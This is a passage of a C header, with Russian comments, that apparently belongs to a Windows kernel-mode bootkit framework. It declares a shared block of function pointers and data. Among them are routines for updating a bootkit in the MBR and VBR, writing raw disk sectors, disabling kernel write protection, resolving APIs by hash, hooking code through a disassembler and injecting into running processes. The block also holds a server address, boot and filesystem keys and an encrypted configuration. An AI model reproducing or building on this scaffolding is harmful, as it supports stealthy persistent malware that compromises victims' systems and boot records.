    pdisk_info_t pBootDiskInfo;     // Указатель на структуру, описывающую загрузочный диск.
    pdisk_info_t pSysDiskInfo;      // Указатель на структуру, описывающую системный диск.
    pvolume_info_t pSysVolumeInfo;  // Указатель на структуру, описывающую системный том.
    uint8_t activeVBR[512];
    uint64_t activeVBROffset;

    char* currBundleName;
    uint8_t* currBundleSha1;
    char currFileURI[200];

    // CRYPTO
    // Приватные функции
    Fnmd5_process fnmd5_process;    
    Fnsha1_process fnsha1_process;

    Fnhardclock fnhardclock;
    Fnhavege_fill fnhavege_fill;

    // Приватные данные
    // base64
    char base64[65 + 7/*padding*/];          // "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";

    // Salsa20
    char sigma[16];           // {0x79,0x97,0x11,0x25,0x85,0x07,0x04,0x88,0x65,0x77,0x77,0x79,0x99,0xDE,0xFA,0x11};
    //    char tau[16];             // {0x0F,0x1E,0x2D,0x3C,0x4B,0x5A,0x69,0x78,0x21,0x34,0x55,0x89,0x79,0xAA,0xBB,0xCC};

    uint8_t hashPadding[64];

    // AES
    // Forward S-box & tables
    unsigned char FSb[256];
    ulong_t FT0[256]; 
    ulong_t FT1[256]; 
    ulong_t FT2[256]; 
    ulong_t FT3[256]; 

    // Reverse S-box & tables
    unsigned char RSb[256];
    ulong_t RT0[256];
    ulong_t RT1[256];
    ulong_t RT2[256];
    ulong_t RT3[256];

    // Round constants
    ulong_t RCON[10];

    // Локальные таблицы из функции aes_gen_tables.
    int pow[256];
    int log[256];

    uint8_t asn1_hash_sha1[15];
    // MPI
    //    mpi_t mpi_exp_mod_W[64];

    int aes_init_done;

    uint32_t randomAuxVarY;
    uint32_t randomConstantVector[128];

    Fndissasm_lock_routine fndissasm_lock_routine;

    uint8_t* pDissasmTable;

    ulong_t nshLockAcquired;
    ulong_t nshCPUsLocked;
    //uint8_t* pTriggerTrampoline;
} mod_common_private_t, *pmod_common_private_t;

typedef struct _mod_common_block* pmod_common_block_t;

// Интерфесные функции
typedef uint32_t (*Fncommon_calc_hash)(uint8_t* name, size_t sz);
typedef pvoid_t (*Fnpe_find_export_by_hash)(uint8_t* basePtr, uint32_t hashVal, Fncommon_calc_hash fngetHash);
typedef uint8_t* (*FnfindModuleBaseByInnerPtr)(uint8_t* ptr);
typedef pvoid_t (*FnfindModuleBaseFromIDT)(PIDTR pIdtr, uint32_t hashVal, pvoid_t* pAddr, FnfindModuleBaseByInnerPtr fnfindBaseByInnerPtr, Fnpe_find_export_by_hash fnfindPExportByHash, Fncommon_calc_hash fngetHash);
typedef uint8_t* (*Fncommon_get_base_from_dirver_object)(PDRIVER_OBJECT pDriverObject, uint32_t* pSize);
typedef uint8_t* (*Fncommon_find_base_by_driver_name)(uint32_t hashVal, uint32_t* pSize);
typedef void (*Fncommon_allocate_memory)(pmod_common_block_t pCommonBlock, pvoid_t* ppVA, size_t size, POOL_TYPE poolType);
typedef void (*Fncommon_disable_wp)();
typedef void (*Fncommon_enable_wp)();
typedef void (*Fncommon_fix_addr_value)(uint8_t* Data, uint32_t Size, uintptr_t Old, pvoid_t New);
typedef bool_t (*FnisValidPointer)(pvoid_t ptr);
typedef int64_t (*Fncommon_atoi64)(const char* str);
typedef uint64_t (*Fncommon_atou64)(const char* str, int maxDigits);
typedef uint8_t (*FngetCurrentProcessor)();
typedef uint32_t (*Fnhtonl)(uint32_t n);
typedef uint16_t (*Fnhtons)(uint16_t x);

/** Присоединяет pDestStr к pStr.

    Присоединение произойдёт в любом случае, однако в случае нехватки места в pStr просоединится только часть pDestStr.
*/
typedef NTSTATUS (*Fncommon_strcpy_s)(char* pszDest, size_t cchDest, const char* pszSrc);
typedef void (*Fncommon_strcat_s)(char* pStr, size_t maxLength, const char* pDestStr);
typedef size_t (*Fncommon_strlen_s)(const char* psz, size_t maxLength);
typedef NTSTATUS (__cdecl *Fncommon_printfA)(NTSTRSAFE_PSTR pszDest, size_t cchDest, NTSTRSAFE_PCSTR pszFormat, ...);
typedef int (*Fncommon_ansi_to_wide)(const char* str, char* wstr, int sz);
typedef int (*Fncommon_wide_to_ansi)(const char* wstr, char* str, int ansiSize);
typedef char* (*Fncommon_strstr)(const char* str1, const char* str2);
typedef NTSTATUS (*Fncommon_wcscpy_s)(NTSTRSAFE_PWSTR pszDest, size_t cchDest, NTSTRSAFE_PCWSTR pszSrc);
typedef NTSTATUS (*Fncommon_wcscat_s)(NTSTRSAFE_PWSTR pszDest, size_t cchDest, NTSTRSAFE_PCWSTR pszSrc);
typedef wchar_t* (*Fncommon_wcsstr)(const wchar_t* str1, const wchar_t* str2);
typedef size_t (*Fncommon_wcslen_s)(const wchar_t* pStr, size_t maxLength);
typedef void (*Fncommon_wcsupper_s)(wchar_t* wstr, int sz);
typedef int (*Fncommon_wcscmp)(wchar_t* wstr1, wchar_t* wstr2);


typedef NTSTATUS (*FnRegistryOpenKey)(PHANDLE hReg, PUNICODE_STRING pKeyName);
typedef void (*FnRegistryReadValue)(HANDLE hReg, PUNICODE_STRING pKeyValue, wchar_t* pValue);

typedef PDEVICE_OBJECT (*Fncommon_dio_det_device_by_name)(wchar_t* devName);
typedef NTSTATUS (*Fncommon_dio_get_volume_info)(PDEVICE_OBJECT pDevice, uint32_t ctrlCode, uint8_t* pBuffer, uint32_t bufSize);
typedef NTSTATUS (*Fncommon_dio_read_sector)(pdisk_info_t pDiskInfo, pvoid_t pBuffer, uint32_t size, uint64_t offset);
typedef NTSTATUS (*Fncommon_dio_write_sector)(pdisk_info_t pDiskInfo, pvoid_t pBuffer, uint32_t size, uint64_t offset);
typedef NTSTATUS (*Fncommon_dio_rw_completion)(IN PDEVICE_OBJECT DeviceObject, IN PIRP Irp, IN pvoid_t Context);
// typedef NTSTATUS (*Fncommon_dio_rw_sector)(pdisk_info_t pDiskInfo, uint32_t mode, pvoid_t pBuffer, uint32_t size, UINT64 offset);
typedef uint64_t (*Fncommon_dio_get_disk_size)(pdisk_info_t pDiskInfo, int precision);
typedef PDEVICE_OBJECT (*Fncommon_dio_get_device_object_by_name)(wchar_t* deviceName, uint32_t devNameLen, pvolume_info_t pDiskInfo);
typedef NTSTATUS (*Fncommon_dio_identify_disk)(pdisk_info_t pDiskInfo);

typedef NTSTATUS (*Fncommon_dio_update_bootkit)(uint8_t* pPayload, bool_t atBegin, pbk_mbr_t pMbr, pbk_ntfs_vbr_t pActiveVBR, ppartition_table_entry_t pActivePartEntry, pvoid_t pParam);
typedef bool_t (*Fncommon_update)(uint8_t* pZkBuffer, pvoid_t pParam);

typedef uint32_t (*Fncommon_get_system_time)();
typedef const char* (*Fncommon_get_base_name)(const char* fullName, uint32_t* pSize);

typedef uint8_t* (*Fncommon_map_driver)(const wchar_t* drvName);
typedef uint8_t* (*Fncommon_get_import_address)(uint8_t* mappedBase, uint8_t* realBase, uint32_t importModuleHash, uint32_t funcHash);

typedef struct _mod_common_block
{
    // Native functions
    FnPsCreateSystemThread fnPsCreateSystemThread;
    FnPsTerminateSystemThread fnPsTerminateSystemThread;
    FnExAllocatePoolWithTag fnExAllocatePoolWithTag;
    FnMmIsNonPagedSystemAddressValid fnMmIsNonPagedSystemAddressValid;
    FnExFreePoolWithTag fnExFreePoolWithTag;
    FnKeDelayExecutionThread fnKeDelayExecutionThread;
    FnRtlGetVersion fnRtlGetVersion;
#ifndef _WIN64
    FnKeInitializeSpinLock fnKeInitializeSpinLock;
    Fn_allmul fn_allmul;
    Fn_alldiv fn_alldiv;
    Fn_aullrem fn_aullrem;
    FnKeQuerySystemTime fnKeQuerySystemTime;
#endif // _WIN64
#ifdef _WIN64
    FnPsWrapApcWow64Thread fnPsWrapApcWow64Thread;
#endif // _WIN64
    Fn_vsnprintf fn_vsnprintf;
    Fnmemset fnmemset;
    Fnmemcpy fnmemcpy;
    Fnmemmove fnmemmove;
    Fnstrcmp fnstrcmp;
    Fnstrlen fnstrlen;
    Fn_stricmp fn_stricmp;
    Fn_wcsicmp fn_wcsicmp;
    FnRtlCompareMemory fnRtlCompareMemory;
    FnIoAllocateMdl fnIoAllocateMdl;
    FnMmProbeAndLockPages fnMmProbeAndLockPages;
    FnKeStackAttachProcess fnKeStackAttachProcess;
    FnKeUnstackDetachProcess fnKeUnstackDetachProcess;
    FnMmMapLockedPagesSpecifyCache fnMmMapLockedPagesSpecifyCache;
    FnMmUnmapLockedPages fnMmUnmapLockedPages;
    FnMmUnlockPages fnMmUnlockPages;
    FnZwCreateFile fnZwCreateFile;
    FnZwDeviceIoControlFile fnZwDeviceIoControlFile;
    FnZwClose fnZwClose;
    FnZwWriteFile fnZwWriteFile;
    FnZwWriteFile fnZwReadFile;
    FnZwQueryInformationFile fnZwQueryInformationFile;
    FnZwSetInformationFile fnZwSetInformationFile;
    FnZwFsControlFile fnZwFsControlFile;
    FnZwWaitForSingleObject fnZwWaitForSingleObject;
    FnZwCreateEvent fnZwCreateEvent;
    FnZwSetEvent fnZwSetEvent;
    FnRtlInitAnsiString fnRtlInitAnsiString;
    FnRtlAnsiStringToUnicodeString fnRtlAnsiStringToUnicodeString;
    FnRtlUnicodeStringToAnsiString fnRtlUnicodeStringToAnsiString;
    FnRtlInitUnicodeString fnRtlInitUnicodeString;
    FnRtlUnicodeStringToInteger fnRtlUnicodeStringToInteger;
    FnRtlFreeUnicodeString fnRtlFreeUnicodeString;
    FnRtlCompareUnicodeString fnRtlCompareUnicodeString;
    FnZwOpenKey fnZwOpenKey;
    FnZwQueryValueKey fnZwQueryValueKey;
    FnPsIsSystemThread fnPsIsSystemThread;
    FnIoGetCurrentProcess fnIoGetCurrentProcess;
    FnPsGetCurrentProcessId fnPsGetCurrentProcessId;
    FnMmMapIoSpace fnMmMapIoSpace;
    FnMmUnmapIoSpace fnMmUnmapIoSpace;
    FnIoFreeMdl fnIoFreeMdl;
    FnKeInitializeSemaphore fnKeInitializeSemaphore;
    FnKeReleaseSemaphore fnKeReleaseSemaphore;
    FnKeWaitForSingleObject fnKeWaitForSingleObject;
    FnKeInitializeEvent fnKeInitializeEvent;
    FnKeClearEvent fnKeClearEvent;
    FnKeSetEvent fnKeSetEvent;
    FnKeInitializeDpc fnKeInitializeDpc;
    FnKeSetImportanceDpc fnKeSetImportanceDpc;
    FnKeSetTargetProcessorDpc fnKeSetTargetProcessorDpc;
    FnKeInsertQueueDpc fnKeInsertQueueDpc;
    FnMmIsAddressValid fnMmIsAddressValid;
    FnNtQuerySystemInformation fnNtQuerySystemInformation;
    FnNtQueryInformationProcess fnNtQueryInformationProcess;
    FnNtQueryInformationThread fnNtQueryInformationThread;
    FnObOpenObjectByName fnObOpenObjectByName;
    FnObOpenObjectByPointer fnObOpenObjectByPointer;
    FnObfReferenceObject fnObfReferenceObject;
    FnObReferenceObjectByHandle fnObReferenceObjectByHandle;
    FnObReferenceObjectByPointer fnObReferenceObjectByPointer;
    FnObfDereferenceObject fnObfDereferenceObject;
    FnNtAllocateVirtualMemory fnNtAllocateVirtualMemory;
    FnZwFreeVirtualMemory fnZwFreeVirtualMemory;
    FnZwOpenDirectoryObject fnZwOpenDirectoryObject;
    FnZwOpenSymbolicLinkObject fnZwOpenSymbolicLinkObject;
    FnZwQuerySymbolicLinkObject fnZwQuerySymbolicLinkObject;
    FnIoBuildDeviceIoControlRequest fnIoBuildDeviceIoControlRequest;
    FnIofCallDriver fnIofCallDriver;
    FnIofCompleteRequest fnIofCompleteRequest;
    FnIoCancelIrp fnIoCancelIrp;
    FnZwQueryDirectoryObject fnZwQueryDirectoryObject;
    FnKeSetBasePriorityThread fnKeSetBasePriorityThread;
    FnKeQueryTickCount fnKeQueryTickCount;
    FnKeQueryTimeIncrement fnKeQueryTimeIncrement;
    FnMmBuildMdlForNonPagedPool fnMmBuildMdlForNonPagedPool;
    FnMmMapLockedPages fnMmMapLockedPages;
    FnKeInitializeApc fnKeInitializeApc;
    FnKeInsertQueueApc fnKeInsertQueueApc;
    FnPsSetCreateProcessNotifyRoutine fnPsSetCreateProcessNotifyRoutine;
    FnPsLookupProcessByProcessId fnPsLookupProcessByProcessId;
    FnKeInitializeMutex fnKeInitializeMutex;
    FnKeReleaseMutex fnKeReleaseMutex;
    FnIoGetDeviceObjectPointer fnIoGetDeviceObjectPointer;
    FnIoBuildSynchronousFsdRequest fnIoBuildSynchronousFsdRequest;
    FnIoGetConfigurationInformation fnIoGetConfigurationInformation;
    FnRtlQueryRegistryValues fnRtlQueryRegistryValues;
    FnObReferenceObjectByName fnObReferenceObjectByName;
    FnExSystemTimeToLocalTime fnExSystemTimeToLocalTime;
    //FnRtlTimeToTimeFields fnRtlTimeToTimeFields;
    FnRtlTimeToSecondsSince1970 fnRtlTimeToSecondsSince1970;
    FnIoRegisterShutdownNotification fnIoRegisterShutdownNotification;
    FnIoUnregisterShutdownNotification fnIoUnregisterShutdownNotification;
    FnCcCopyWrite fnCcCopyWrite;
    FnIoGetAttachedDeviceReference fnIoGetAttachedDeviceReference;
    FnIoGetDeviceAttachmentBaseRef fnIoGetDeviceAttachmentBaseRef;
    FnIoAllocateIrp fnIoAllocateIrp;
    FnIoFreeIrp fnIoFreeIrp;
    FnKeInitializeTimer fnKeInitializeTimer;
    FnKeSetTimerEx fnKeSetTimerEx;
    FnKeCancelTimer fnKeCancelTimer;
    FnIoRegisterLastChanceShutdownNotification fnIoRegisterLastChanceShutdownNotification;
    FnDbgPrint fnDbgPrint;

    FnKfAcquireSpinLock fnKfAcquireSpinLock;
    FnKfReleaseSpinLock fnKfReleaseSpinLock;
    FnKfLowerIrql fnKfLowerIrql;
    FnKfRaiseIrql fnKfRaiseIrql;
    FnKeGetCurrentIrql fnKeGetCurrentIrql;

    Fncommon_calc_hash fncommon_calc_hash;
    FnfindModuleBaseByInnerPtr fnfindModuleBaseByInnerPtr;
    FnfindModuleBaseFromIDT fnfindModuleBaseFromIDT;
    Fncommon_get_base_from_dirver_object fncommon_get_base_from_dirver_object;
    Fncommon_find_base_by_driver_name fncommon_find_base_by_driver_name;
    Fnpe_find_export_by_hash fnpe_find_export_by_hash;    
    Fncommon_allocate_memory fncommon_allocate_memory;
    Fncommon_disable_wp fncommon_disable_wp;
    Fncommon_enable_wp fncommon_enable_wp;
    Fncommon_fix_addr_value fncommon_fix_addr_value;
    FnisValidPointer fnisValidPointer;
    Fncommon_atoi64 fncommon_atoi64;
    Fncommon_atou64 fncommon_atou64;
    Fncommon_save_file fncommon_save_file;
    FngetCurrentProcessor fngetCurrentProcessor;
    Fnhtonl fnhtonl;
    Fnhtons fnhtons;
    Fncommon_wcscpy_s fncommon_wcscpy_s;
    Fncommon_wcscat_s fncommon_wcscat_s;
    Fncommon_wcslen_s fncommon_wcslen_s;
    Fncommon_wcsupper_s fncommon_wcsupper_s;
    Fncommon_wcscmp fncommon_wcscmp;
    Fncommon_strcpy_s fncommon_strcpy_s;
    Fncommon_strcat_s fncommon_strcat_s;
    Fncommon_strlen_s fncommon_strlen_s;
    Fncommon_printfA fncommon_printfA;
    Fncommon_ansi_to_wide fncommon_ansi_to_wide;
    Fncommon_wide_to_ansi fncommon_wide_to_ansi;
    Fncommon_strstr fncommon_strstr;
    Fncommon_wcsstr fncommon_wcsstr;

    Fncommon_dio_det_device_by_name fncommon_dio_det_device_by_name;
    Fncommon_dio_get_volume_info fncommon_dio_get_volume_info;
    Fncommon_dio_read_sector fncommon_dio_read_sector;
    Fncommon_dio_write_sector fncommon_dio_write_sector;
    Fncommon_dio_rw_completion fncommon_dio_rw_completion;
//     Fncommon_dio_rw_sector fncommon_dio_rw_sector;
    Fncommon_dio_get_disk_size fncommon_dio_get_disk_size;
    Fncommon_dio_get_device_object_by_name fncommon_dio_get_device_object_by_name;
    Fncommon_dio_identify_disk fncommon_dio_identify_disk;
    Fncommon_dio_update_bootkit fncommon_dio_update_bootkit;
    Fncommon_update fncommon_update;
    Fncommon_get_system_time fncommon_get_system_time;
    Fncommon_get_base_name fncommon_get_base_name;
    Fncommon_map_driver fncommon_map_driver;
    Fncommon_get_import_address fncommon_get_import_address;

    //    FnUtilsGetApiFuncVA fnUtilsGetApiFuncVA;
    //    FnUtilsDisablePageNXBit fnUtilsDisablePageNXBit;

    //    FnKdVersionBlockDpc fnKdVersionBlockDpc;

//    FnUtilsAllocateMemory fnUtilsAllocateMemory;    

    FnTasksProcess fnTasksProcess;

    FnUtilsGetSystem fnUtilsGetSystem;
    FnUtilsFindServiceTableEntry fnUtilsFindServiceTableEntry;

    FnRegistryOpenKey fnRegistryOpenKey;
    FnRegistryReadValue fnRegistryReadValue;

    //    FnInstallUserModeApc fnInstallUserModeApc;
    //    FnKernelRoutine fnKernelRoutine;

    FnInjectIntoExistingProcess fnInjectIntoExistingProcess;

    //    Fnplug_holes fnplug_holes;

    FnUtilsAtomicAdd16 fnUtilsAtomicAdd16;
    FnUtilsAtomicGet fnUtilsAtomicGet;
    FnUtilsAtomicSub16 fnUtilsAtomicSub16;

    Fncommon_initialize_list_head fncommon_initialize_list_head;
    Fncommon_is_list_empty fncommon_is_list_empty;
    Fncommon_remove_entry_list fncommon_remove_entry_list;
    Fncommon_remove_head_list fncommon_remove_head_list;
    Fncommon_remove_tail_list fncommon_remove_tail_list;
    Fncommon_insert_tail_list fncommon_insert_tail_list;
    Fncommon_insert_head_list fncommon_insert_head_list;
    Fncommon_append_tail_list fncommon_append_tail_list;



    // CRYPTO
    Fnbase64_encode fnbase64_encode;
    Fnbase64_decode fnbase64_decode;

    Fnmd5_start fnmd5_start;
    Fnmd5_update fnmd5_update;
    Fnmd5_finish fnmd5_finish;
    Fnmd5 fnmd5;
    //  Fnmd5_hmac_start fnmd5_hmac_start;
    //  Fnmd5_hmac_update fnmd5_hmac_update;
    //  Fnmd5_hmac_finish fnmd5_hmac_finish;
    //  Fnmd5_hmac_reset fnmd5_hmac_reset;
    //  Fnmd5_hmac fnmd5_hmac;

    Fnsha1_start fnsha1_start;
    Fnsha1_update fnsha1_update;
    Fnsha1_finish fnsha1_finish;
    Fnsha1 fnsha1;
    //  Fnsha1_hmac_start fnsha1_hmac_start;
    //  Fnsha1_hmac_update fnsha1_hmac_update;
    //  Fnsha1_hmac_finish fnsha1_hmac_finish;
    //  Fnsha1_hmac_reset fnsha1_hmac_reset;
    //  Fnsha1_hmac fnsha1_hmac;

    //  Fnsalsa20_key_setup fnsalsa20_key_setup;
    //  Fnsalsa20_encrypt fnsalsa20_encrypt;
    Fnhavege_init fnhavege_init;
    Fnhavege_rand fnhavege_rand;


    Fnlzma_decode fnlzma_decode;


    Fnaes_gen_tables fnaes_gen_tables;
    Fnaes_setkey_enc fnaes_setkey_enc;
    Fnaes_setkey_dec fnaes_setkey_dec;
    Fnaes_crypt_ecb fnaes_crypt_ecb;
    Fnaes_crypt_cbc fnaes_crypt_cbc;

    Fnmpi_init fnmpi_init;
    Fnmpi_free fnmpi_free;
    Fnmpi_grow fnmpi_grow;
    Fnmpi_copy fnmpi_copy;
    Fnmpi_lset fnmpi_lset;
    Fnmpi_lsb fnmpi_lsb;
    Fnmpi_msb fnmpi_msb;
    Fnmpi_size fnmpi_size;
    Fnmpi_read_binary fnmpi_read_binary;
    Fnmpi_write_binary fnmpi_write_binary;
    Fnmpi_shift_l fnmpi_shift_l;
    Fnmpi_shift_r fnmpi_shift_r;
    Fnmpi_cmp_abs fnmpi_cmp_abs;
    Fnmpi_cmp_mpi fnmpi_cmp_mpi;
    Fnmpi_cmp_int fnmpi_cmp_int;
    Fnmpi_add_abs fnmpi_add_abs;
    Fnmpi_sub_hlp fnmpi_sub_hlp;
    Fnmpi_sub_abs fnmpi_sub_abs;
    Fnmpi_add_mpi fnmpi_add_mpi;
    Fnmpi_sub_mpi fnmpi_sub_mpi;
    Fnmpi_sub_int fnmpi_sub_int;
    Fnmpi_mul_hlp fnmpi_mul_hlp;
    Fnmpi_mul_mpi fnmpi_mul_mpi;
    Fnmpi_mul_int fnmpi_mul_int;
    Fnmpi_div_mpi fnmpi_div_mpi;
    Fnmpi_mod_mpi fnmpi_mod_mpi;
    Fnmpi_montg_init fnmpi_montg_init;
    Fnmpi_montmul fnmpi_montmul;
    Fnmpi_montred fnmpi_montred;
    Fnmpi_exp_mod fnmpi_exp_mod;
    Fnmpi_gcd fnmpi_gcd;

    Fnrsa_init fnrsa_init;
    Fnrsa_free fnrsa_free;
    Fnrsa_check_pubkey fnrsa_check_pubkey;
    Fnrsa_check_privkey fnrsa_check_privkey;
    Fnrsa_public fnrsa_public;
    Fnrsa_private fnrsa_private;
    Fnrsa_pkcs1_encrypt fnrsa_pkcs1_encrypt;
    Fnrsa_public_decrypt_hash fnrsa_public_decrypt_hash;
    //     Fnrsa_pkcs1_sign fnrsa_pkcs1_sign;
    //     Fnrsa_pkcs1_verify fnrsa_pkcs1_verify;

    Fnarc4_crypt_self fnarc4_crypt_self;
    Fncrypto_random_init fncrypto_random_init;
    Fncrypto_random fncrypto_random;


    // DISASSM
#ifdef _WIN64
    Fndissasm64 fndissasm64;
#else
    Fndissasm32 fndissasm32;
#endif
    Fndissasm fndissasm;

    Fndissasm_install_hook fndissasm_install_hook;
    Fndissasm_uninstall_hook fndissasm_uninstall_hook;


//     FnDiskIOGetDeviceObjectByLetter fnDiskIOGetDeviceObjectByLetter;
//     FnDiskIOIdentifyDevice fnDiskIOIdentifyDevice;
//     FnUtilsFindBaseByInnerPtr fnUtilsFindBaseByInnerPtr;
    wchar_t systemRootW[128];
    char systemRootA[128];
    char sysVolInfoA[128];

    pconfiguration_t pConfig;

    // Динамические параметры.
    uint32_t serverAddr;

    uint8_t bootKey[48];
    uint8_t fsKey[48];

    char configPath[16];
    char configPrivatePath[24];
    uint8_t configKey[20];

    // Временные объекты.
    padapter_entry_t pAdapters;
    uint32_t adaptersCount;

    mod_common_private_t;
} mod_common_block_t, *pmod_common_block_t;

#ifdef _WIN64
#define KI_USER_SHARED_DATA 0xFFFFF78000000000UI64

#define SharedUserData ((KUSER_SHARED_DATA * const)KI_USER_SHARED_DATA)

#define SharedInterruptTime (KI_USER_SHARED_DATA + 0x8)
#define SharedSystemTime (KI_USER_SHARED_DATA + 0x14)
#define SharedTickCount (KI_USER_SHARED_DATA + 0x320)

#define KeQueryInterruptTime() *((volatile ULONG64 *)(SharedInterruptTime))

#define KeQuerySystemTime(CurrentCount)                                     \
    *((PULONG64)(CurrentCount)) = *((volatile ULONG64 *)(SharedSystemTime))

#define KeQueryTickCount(CurrentCount)                                      \
    *((PULONG64)(CurrentCount)) = *((volatile ULONG64 *)(SharedTickCount))
#endif // _WIN64

#define SYS_ALLOCATOR(sz) pGlobalBlock->pCommonBlock->fnExAllocatePoolWithTag(NonPagedPool, sz, ALLOCATOR_TAG)
#define SYS_DEALLOCATOR(ptr) pGlobalBlock->pCommonBlock->fnExFreePoolWithTag(ptr, ALLOCATOR_TAG)
#define MEMCPY(dest, src, size) pGlobalBlock->pCommonBlock->fnmemcpy(dest, src, size);
#define MEMSET(dest, val, size) pGlobalBlock->pCommonBlock->fnmemset(dest, val, size);
#define MEMCMP(dest, src, size) pGlobalBlock->pCommonBlock->fnRtlCompareMemory(dest, src, size) == size
#define STRLEN(str) pGlobalBlock->pCommonBlock->fncommon_strlen_s(str, 65535)
#define STRCMP(str1, str2) pGlobalBlock->pCommonBlock->fnstrcmp(str1, str2)
#define STRCPY_S(str1, sz, str2) pGlobalBlock->pCommonBlock->fncommon_strcpy_s(str1, sz, str2)

#define RTL_INIT_ANSI_STRING pGlobalBlock->pCommonBlock->fnRtlInitAnsiString
#define RTL_ANSI_STRING_TO_UNICODE_STRING pGlobalBlock->pCommonBlock->fnRtlAnsiStringToUnicodeString
#define RTL_FREE_UNICODE_STRING pGlobalBlock->pCommonBlock->fnRtlFreeUnicodeString
#define EX_ALLOCATE_POOL_WITH_TAG pGlobalBlock->pCommonBlock->fnExAllocatePoolWithTag
#define EX_FREE_POOL_WITH_TAG pGlobalBlock->pCommonBlock->fnExFreePoolWithTag
#define KE_STACK_ATTACH_PROCESS pGlobalBlock->pCommonBlock->fnKeStackAttachProcess
#define KE_UNSTACK_DETACH_PROCESS pGlobalBlock->pCommonBlock->fnKeUnstackDetachProcess
#define NT_ALLOCATE_VIRTUAL_MEMORY pGlobalBlock->pCommonBlock->fnNtAllocateVirtualMemory
#define NT_FREE_VIRTUAL_MEMORY pGlobalBlock->pCommonBlock->fnZwFreeVirtualMemory
#define KE_INITIALIZE_APC pGlobalBlock->pCommonBlock->fnKeInitializeApc
#define KE_INSERT_QUEUE_APC pGlobalBlock->pCommonBlock->fnKeInsertQueueApc
#define MM_IS_ADDRESS_VALID pGlobalBlock->pCommonBlock->fnMmIsAddressValid
#define NT_QUERY_INFORMATION_PROCESS pGlobalBlock->pCommonBlock->fnNtQueryInformationProcess
#define ZW_CREATE_FILE pGlobalBlock->pCommonBlock->fnZwCreateFile
#define ZW_READ_FILE pGlobalBlock->pCommonBlock->fnZwReadFile
#define ZW_WRITE_FILE pGlobalBlock->pCommonBlock->fnZwWriteFile
#define ZW_CLOSE pGlobalBlock->pCommonBlock->fnZwClose
#define ZW_QUERY_INFORMATION_FILE pGlobalBlock->pCommonBlock->fnZwQueryInformationFile
#define FN_ZW_SET_INFORMATION_FILE pGlobalBlock->pCommonBlock->fnZwSetInformationFile
#define FN_STRICMP pGlobalBlock->pCommonBlock->fn_stricmp
#define FN_STRCPY_S pGlobalBlock->pCommonBlock->fncommon_strcpy_s
#define FN_RTL_STRING_CCH_PRINTFA pGlobalBlock->pCommonBlock->fnFnRtlStringCchPrintfA
/*
#define PS_WRAP_APC_WOW64_THREAD PsWrapApcWow64Thread
*/


#define TINFL_DECOMPRESS pGlobalBlock->pCommonBlock->fntinfl_decompress

#define FN_HARDCLOCK pGlobalBlock->pCommonBlock->fnhardclock
#define FN_HAVEGE_INIT pGlobalBlock->pCommonBlock->fnhavege_init
#define FN_HAVEGE_RAND pGlobalBlock->pCommonBlock->fnhavege_rand

#define RANDOM_AUX_VARY pGlobalBlock->pCommonBlock->randomAuxVarY
#define RANDOM_CONSTANT_VECTOR pGlobalBlock->pCommonBlock->randomConstantVector

#define FN_TINF_BUILD_BITS_BASE pGlobalBlock->pCommonBlock->fntinf_build_bits_base
#define FN_TINF_BUILD_TREE pGlobalBlock->pCommonBlock->fntinf_build_tree
#define FN_TINF_GETBIT pGlobalBlock->pCommonBlock->fntinf_getbit
#define FN_TINF_READ_BITS pGlobalBlock->pCommonBlock->fntinf_read_bits
#define FN_TINF_DECODE_SYMBOL pGlobalBlock->pCommonBlock->fntinf_decode_symbol
#define FN_TINF_INFLATE_BLOCK_DATA pGlobalBlock->pCommonBlock->fntinf_inflate_block_data
#define FN_TINF_ADLER32 pGlobalBlock->pCommonBlock->fntinf_adler32
#define FN_TINF_INIT pGlobalBlock->pCommonBlock->fntinf_init
#define FN_TINF_DECOMPRESS pGlobalBlock->pCommonBlock->fntinf_decompress

#endif // __MODSHARED_COMMONAPI_H_
